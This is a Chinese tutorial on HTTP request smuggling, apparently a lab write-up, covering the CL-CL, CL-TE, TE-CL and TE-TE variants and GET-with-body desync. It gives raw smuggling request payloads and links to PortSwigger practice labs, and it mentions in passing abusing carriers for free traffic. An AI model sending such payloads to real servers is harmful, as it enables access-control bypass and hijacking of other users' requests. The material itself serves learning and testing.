# https欺骗

### 0x01 原理分析

http走私是一个很神奇的攻击方式，他根本产生的原因是因为不同服务器对于`RFC`协议的执行情况不同。这里面最常见的一个例子就是`CDN`加速。用户通过链接距离其最近的反向代理服务器，当用户请求的静态资源在CDN服务器上有备份的时候，那么就不需要再继续进行下去了，就可以直接获取到想要的数据。

![image-20210206130418555](https://i.loli.net/2021/02/06/ZICRsx8AzeHTXvQ.png)

当我们向代理服务器发送一个比较模糊的HTTP请求的时候，由于两者的实现方式不同，那我们就可以浑水摸鱼，让代理服务器将我们的请求完整地转发到后端服务器，但后端服务器通过`CL`和`TE`头的检测来判断`请求的结束`，这个时候，我们可以让他以为其中的一部分是正常请求，剩下的一部分就会被留在缓冲区中，加入到下一场正常请求的头部。（这里，就像当前市场上的很多钻运营商的空子是一样，通过混淆达到，使计费服务器和联网服务器识别到`HOST`不同，从而让服务器端摸不清头脑，达到流量无限用的结果）

![image-20210206130146255](https://i.loli.net/2021/02/06/nsbXE3iyqpoLIzB.png)

关于TE和CL头不明白建议查看以下的文章:

https://imququ.com/post/transfer-encoding-header-in-http.html

### 0x02 分类

#### CL不为0的GET请求

假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的`Content-Length`头，不进行处理。这就有可能导致请求走私。

```
GET /HTTP/1.1
Host: dem0.com
Content-Length: 41

GET /secret HTTP/1.1
Host: dem0.com

```

前端服务器接受到请求后，因为GET请求中，附带有请求体，根据Content-Length来判断秦秋的接受，然后会把整个请求转发到后端服务器中。

后端服务器因为不解析，这样就会变成两个请求

```
GET /HTTP/1.1
Host: dem0.com
Content-Length: 41

```

第二个

```
GET /secret HTTP/1.1
Host: dem0.com

```

这个时候。因为校验一般都在前端服务器中，后端服务器对于前端服务器发送过来的请求保持绝对信任，然后我们就会请求秘密的界面数据。

#### CL-CL

这个类型的相对于要比较好理解一点，这个就是在一个请求中，我们包含了两个CL请求头，并且前后端服务器解析的请求头不一致导致的问题。但其实在RFC规定中，规定当服务器收到的请求中包含两个`Content-Length`，而且两者的值不同时，需要返回400错误。

但是有的服务器在具体的处理中，并不会这样来处理，并且我们假设，前端服务器解析第二个请求，后端请求解析第一个请求

```
POST / HTTP/1.1
Host: dem0.com
Content-Length: 5
Content-Length: 6
\r\n
0\r\n
\r\n
G
```

这样前端服务器会被请求完美地转发到后端服务器中，但是后端服务器在解析的时候，就会把`G`滞留在缓冲区中，这样就会导致GG的情况产生。

这个我们在实际的生产中，是不会碰到，因为都会直接400.如果在比赛中碰到了，那就是太垃圾。但是这个可以构造`csrf`

如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length

#### CL-TE

所谓的CL-TE其实就就是`Content-Length`和`Transfer-Encoding` 前端代理服务器只处理`Content-Length`这一请求头，而后端服务器会遵守`RFC2616`的规定，忽略掉`Content-Length`，处理`Transfer-Encoding`这一请求头。

这里来介绍一下，这个TE的解析，他在实际的解析中，数据结构如下所示

```
[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
```

也就是只要检测到

```
0\r\n
\r\n
```

这样的话，我们的请求就会识别为结束，剩下的数据也只会滞留在缓冲区中。

```
Content-Length: 15
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
Dem0
```

![image-20210206093719558](https://i.loli.net/2021/02/06/NmP5OBEnUqLflGT.png)

```
\r\n
0\r\n
\r\n
Dem0
```

这是15长度的数据

然后，后端服务器在探测到

```
0\r\n
\r\n
```

就认为是一次的请求结束了，就不会继续向下去看，于是这些数据就留在了缓冲区中。然后就会拼接在下一次的请求之中。

#### TE-CL

这个就是和上面的数据是相反的，我们只需要继续测试即可。

```
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

这样就会成功报错。

#### TE-TE

前后端服务器都处理`Transfer-Encoding`请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的`Transfer-Encoding`进行某种混淆操作，从而使其中一个服务器不处理`Transfer-Encoding`请求头。这又是考验师傅们混淆的思路了。

```
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
\r\n
```

#### 0x03 实战

实验室的地址:https://portswigger.net/web-security/request-smuggling

https://portswigger.net/web-security/learning-path

#### CL-TE

lab:https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

这里面的0时chunked的结束标志(chunk size)

![image-20210206131801574](https://i.loli.net/2021/02/06/TOfwQMRA6n9gdWL.png)

#### TE-CL

lab:https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

![image-20210206164211279](https://i.loli.net/2021/02/06/6wqBYa9etshyKAb.png)

![image-20210206165030203](https://i.loli.net/2021/02/06/LcVpdSZhomQGBJ5.png)

其中的数字13要和下面的字节大小对应，不能忘记了`Transfer-Encoding`的格式

#### TE-TE

![image-20210206165649235](https://i.loli.net/2021/02/06/Jd8nIAzw4CXga7s.png)

这便是经过测试的部分网站的绕过检测机制，下面给出一个示例。

![image-20210206170017432](https://i.loli.net/2021/02/06/s4oJ5UYLkcbK3EP.png)

![image-20210206170045135](https://i.loli.net/2021/02/06/qWH23ponNBmtrKG.png)

![image-20210206170127432](https://i.loli.net/2021/02/06/o6hK2IlbwcRGUSj.png)

```
tab键可能不好用
```

结束，散花。还有一道题目是2019roar的calc，有其他绕过方式，大家可做。

推荐一个大佬的博客:https://regilero.github.io/tag/Smuggling/

